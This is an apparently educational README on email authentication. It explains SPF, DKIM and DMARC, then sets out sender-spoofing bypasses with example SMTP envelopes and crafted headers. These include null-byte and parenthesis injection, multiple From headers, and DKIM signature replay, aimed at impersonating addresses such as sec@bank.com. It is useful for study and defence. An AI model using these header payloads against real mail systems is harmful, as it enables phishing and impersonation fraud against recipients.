# Attack-Techniques-on-Email-Authentication
## Basic concepts

### TXT record

- `**A TXT record**` in DNS is a type of record used to `store custom text information` related to specific domain nam. TXT record are commonly used to store information such as authentication information, authorship indentification, text certification or other instructions for email servers and other service.
    
    ⇒ Therefore, A TXT record is usually used by `**SPF (Sender Policy Frameword)**`
    

### Protocol in email

- In Email, we have three main protocol that is SMTP, IMAP / POP3 and their secure protocols correspond (SMTPS, IMAPS and POP3S)
- The operation mechanism of the three protocols is described like following:
  
    ![image](https://github.com/thanhlam-attt/Attack-Techniques-on-Email-Authentication/assets/79523444/2c249d51-cf19-43a2-965e-470087eb407e)

    
    1. Thanh (thanh@thanh.com) uses UA to write and send email to Lam (lam@lam.com)
    2. Thanh’s UA uses SMTP protocol to send email to Thanh’s mail server 
    3. Thanh’s Mail Server put Thanh’s email to message queue
    4. Thanh’s Mail Server opens a TCP connection to Lam’s Mail Server and sends email over the TCP connection (uses SMTP protocol) 
    5. Lam’s Mail Server put Thanh’s email to the mailbox in his Mail Server
    6. Bob uses UA to pop Thanh’s email from the mailbox and read email (uses POP3/IMAP protocol) 
- In Connection Establishment SMTP, the MTA Client in Thanh’s Mail Server will send a HELO message (`HELO thanh.com`) to the MTA Server in Lam’s Mail Server if the MTA Server responds with status code 250 OK ⇒ Move to phase SMTP Transfer
- In phase SMTP Transfer, MTA Client will send MAIL FROM message (`MAIL FROM thanh@thanh.com`) and RCPT TO message (`RCPT TO: lam@lam.com`)
    - If the MTA Server responds with status code 250 OK for both two messages ⇒ MTA Client starts send email with headers From (`From: thanh@thanh.com`) and To (`To: lam@lam.com`)
    - HELO and MAIL FROM are usually not displayed but From and To are visible to the end-user
- Because the original SMTP has no built-in authentication mechanism ⇒ ***Anyone can spoof any indentify in HELO/MAIL FROM and From header (step 4 in the image)***

## The operation mechanism of authentication in Email

### Sender Policy Framework (SPF)

![image](https://github.com/thanhlam-attt/Attack-Techniques-on-Email-Authentication/assets/79523444/88444e07-5b72-44d8-be5a-b2b9c09f8cd2)


- Thanh’s Mail Server public authorized IP lits via `TXT record`
- Lam’s Mail Server query the domail in `HELO` and `MAIL FROM` to obtain the IP lists
- Check if the sender’s IP matches the IP lists, if yes, SPF pass

→ Attacker can’t spoofing domain thanh.com to send email to user Lam because Attacker’s IP not in authorized IP lists

- But attacker can modify HELO and MAIL FROM to attacker’s domain to control this IP list (these header values won’t be displayed to the end-user) ⇒ SPF bypass

### DomainKeys Indentified Mail (DKIM)

![image](https://github.com/thanhlam-attt/Attack-Techniques-on-Email-Authentication/assets/79523444/b97503b9-5f4f-4d04-ad51-9de4c189bba9)


- Thanh’s Mail Server publish public key via DNS (TXT record)
- Generate `DKIM-Signature` with private key and attach it to the message
- Lam’s Mail Server query `“s._domainkey.d” (keyt._domainkey.thanh.com)` to obtain public key
    
    ![image](https://github.com/thanhlam-attt/Attack-Techniques-on-Email-Authentication/assets/79523444/c5f0912a-6f74-4b85-bf4c-d7ce38c879ea)

    
- Validate `DKIM-signature` with the public key
    
    ***(DKIM will check if d in s._domainkey.d ≠ domain in HELO or From header → deny without check DKIM-signature - DMARC policy)***
    

⇒ So, Attacker can’t spoofing DKIM-signature because they don’t have private key

- If the attacker modifies `d` and `s` values and takes place his DKIM-signature → DKIM pass but these values will display to the end-user

⇒ But, neither SPF nor DKIM validate `the From header` that is displayed to the end-user. And with DKIM, attacker can injection `d` values - In two cases **Ambiguity: what DKIM uses differs from what DNS queries**  and **DKIM Authentication Results Injection**

### Domain Message Authentication, Reporting and Conformance (DMARC)

![image](https://github.com/thanhlam-attt/Attack-Techniques-on-Email-Authentication/assets/79523444/a848a745-a4e5-45d2-b1c0-32e03063c770)

- The email passes DMARC authentication if:
    1. Either SPF or DKIM show a positive result
    2. the From header domain passes the alignment test

⇒ Email Authentication Flow will be following:

- Find Authorized IP list by query the domain in HELO and MAIL FROM for TXT record → Check SPF
- Query TXT record domain `d._domain_key.domain` to obtain the public key and verify DKIM-signature by this key → Check DKIM
- Query TXT record domain in the From header and check alignment with From → Check DMARC

![image](https://github.com/thanhlam-attt/Attack-Techniques-on-Email-Authentication/assets/79523444/f444e5db-c40e-4226-beb3-70e2acb66cf1)


### How SPF/DKIM forwards results to DMARC

- RFC 8601 define Authentication-Results header for communicating results between SPF/DKIM and DMARC:
    
    ```xml
    Authentication-Results: example.com; spf=pass
    			smtp.mailfrom=sender@sender.com; dkim=pass (1024-bit key)
    			reason="signature ok" header.d=sender.com
    ```
    
    - DMARC extracts “smtp.mailfrom” and “header.d” to check alignment with From header
        - `smtp.mailfrom` is MAIL FROM header pass SPF
        - `Header.d` is d value in DKIM-signature

## Bypassing the Authentication

### Ambiguity: SPF uses HELO, and DMARC uses MAIL FROM

- The following is one case of this ambiguity:
    
    ```
    HELO attack.com
    MAIL FROM: <any@not_exist.bank.com>
    
    ----------------------------------------
    From: <sec@bank.com>
    To: <victim@victim.com>
    
    Dear,...
    ```
    
    - Attacker set the MAIL FROM to not_exist subdomain of bank.com
    - SPF can’t verify MAIL FROM, and can only verify HELO → SPF will forward HELO authentication result to DMARC
    - Because MAIL FROM is not empty → DMARC uses MAIL FROM for the alignment test
    
    ⇒ SPF will pass because HELO domain is under attacker’s control. DMARC will pass because MAIL FROM and From header has the same registered domain
    

### Ambiguity: what DKIM uses differs from what DNS queries

```
HELO attack.com
MAIL FROM: <any@attack.com>

----------------------------------------
DKIM-Signature:...;d=bank.com;s=attack.com.\x00.any;...
From: <sec@bank.com>
To: <victim@victim.com>

Dear,...
```

- Attacker signs the messsage with his private key and sends the message
- When receiving the message, DKIM use `attack.com.\x00.any._domainkey.bank.com` to obtain public key
- But DNS will parse above domain and treat `\x00` as a terminator ⇒ domain to obtain public key will be attacker.com ⇒ DKIM pass
- From domain is equal to the the detect domain (`d` value in DKIM-signature)⇒ DMARC pass

### DKIM Authentication Results Injection

```
HELO attack.com
MAIL FROM: <any@attack.com>

----------------------------------------
DKIM-Signature:...;d=bank.com(.attacker.com;s=any;...
From: <sec@bank.com>
To: <victim@victim.com>

Dear,...
```

- Attacker signs the messsage with his private key and sends the message
- When receiving the message, DKIM use `any.bank.com(.attacker.com` to obtain public key and this is domain of attacker ⇒ DKIM pass
- Authentication-Result will be:
    
    ```
    Authentication-Results:	dkim=pass (1024-bit key)
    			reason="signature ok" header.d=bank.com(.attacker.com
    ```
    
    - DMARC will parses the content after `(` character as a comment ⇒ uses `bank.com` to check alignment with From header ⇒ DMARC pass

### SPF Authentication Results Injection

```
HELO attack.com
MAIL FROM: <any@bank.com(.attacker.com>

----------------------------------------
From: <sec@bank.com>
To: <victim@victim.com>

Dear,...
```

- SPF will verify `bank.com(.attacker.com` in MAIL FROM and attack.com in HELO, because this is attacker’s domain → attacker can control this ⇒ SPF pass
- Authentication-Result will be:
    
    ```
    Authentication-Results: attack.com; spf=pass
    			smtp.mailfrom=any@bank.com(.attacker.com
    ```
    
    - DMARC parsers `(` character as comment and smtp.mailfrom is equal to `any@bank.com` and has the same domain with the From header ⇒ DMARC pass

### Multiple From headers

```
From: <any@attack.com>
From: <admin@bank.com>
To: <victim@victim.com>

Dear,...
```

- DMARC verifies the red line and MUA display the blue line
    - Because header.d (DKIM) and smtp.mailfrom (SPF) are attacker’s domain
        
        ```
        Authentication-Results: attack.com; spf=pass
        			smtp.mailfrom=any@attack.com; dkim=pass (1024-bit key)
        			reason="signature ok" header.d=attack.com
        ```
        
        ⇒ If DMARC verifies the red line, DMARC pass
        
- RFC 5322: message with multiple From should be rejected. But in practice: 19/29 accept (15 show first for end-user, 3 show last and 1 show both)
- Three types of variants:
    1. `_From: any@attack.com`
    2. `From_: any@attack.com`
    3. `From\r\n_: any@attack.com`
    
    ```
    From:
     <any@attack.com>
    From: <admin@bank.com>
    To: <victim@victim.com>
    
    Dear,...
    ```
    

### Multiple From headers with Normalization

- Another variation is to utilize the normalization behaviors:
    
    ```
    From: <any@attack.com>
    From   : <admin@bank.com>
    To: <victim@victim.com>
    
    Dear,...
    ```
    
    - The second one is containing a space in the header name
    - The DMARC in Mail Server will recognize the first one and verify it
    - When Mail Server forward email to the MUA, It normalized the header and to remove this space → the MUA will pick up the second one to display

### From/Sender Ambiguity

- 7/19 MUAs displays Sender or Resent-From header value when From header is absendt
    
    ```
    From
    	: <any@attack.com>
    Sender: <admin@bank.com>
    To: <victim@victim.com>
    
    Dear,...
    ```
    
    - The Receiving Service (Mail Server) will be able to recognize the From header in that format and verify that
    - But, the MUA won’t be able to recognize that and the email don’t have the From header ⇒ display the Sender header value (the second one)

### Inconsistencies in Email Parsing Process

```
From: <any@attack.com>, <admin@bank.com>
```

- With multi identifies like above, Mail Server will parser the red words and Email client (MUA) wil parser the blue words ⇒ DMARC pass, the second one will be displayed to the end-user

```
From: <@attack.com>, @any.com: admin@bank.com
```

- Similar, the above and following line also bypass DMARC and display legitimate email to the end-user:

```
From: bs64(<admin@bank.com>), <any@attack.com>
From: <admin@bank.com>\, <any@attack.com>
From: <any@attack.com><admin@bank.com>
```

### Spoofing via an Email Service Account

- Attacker can custom MUA to send Email to the Sending Services, example:
    - Attacker (attacker@gmail.com) tries to spoof admin@gmail.com by modify the From header to admin@gmail.com
    - But if Sending services ensure that the From header matches authenticated username ⇒ Attacker can spoof admin@gmail.com by above way
- Attacker can combining Replay and Multiple-From Ambiguity:
    - First, attacker with an email service account (attacker@gmail.com) will create deceptive content in body, To and Subject but not From header and send to himself to obtain DKIM-Signature
        
        ```
        CUSTOM MUA (attacker@gmail.com) —> Sending Service (gmail.com) —> Attacker server
        
        RCPT TO: <attacker@gmail.com>
        ----------------------------------
        DKIM-Signature:...;s=selector;d=gmail.com
        From: <attacker@gmail.com>
        To: <victim@victim.com>
        
        Dear Customer,
        ....
        ```
        
        - Sice in the envelope the RCPT TO header is attacker@gmail.com ⇒ ***this email actually going to be delivered to the attacker himself***
        - And the Sending Service (gmail.com) will provide a valid DKIM-Signature signed by signing the From and To and the Content ⇒ when victim verify signature with the From header is attacker’s email, signature OK
    - And Attacker will use his own attacker server to send a email with two From header like Multiple From headers teachniques
        
        ```
        MUA —> Attacker Server —> Receiving Services —> MUA
        
        RCPT TO: <attacker@gmail.com>
        ----------------------------------
        DKIM-Signature:...;s=selector;d=gmail.com
        From: <admin@gmail.com>
        From: <attacker@gmail.com>
        To: <victim@victim.com>
        
        Dear Customer,
        ....
        ```
        
        - DKIM components verify the last header (attacker@gmail.com) ⇒ DKIM pass (Because a valid DKIM-Signature signed by signing the From [attacker@gmail.com] and To [victim@gmail.com] and the Content [Dear Customer,...])
        - MUAs show the fist header (admin@gmail.com) ⇒ admin@gmail.com will be displayed to the end-user

https://www.youtube.com/watch?v=reRzWHUwI80
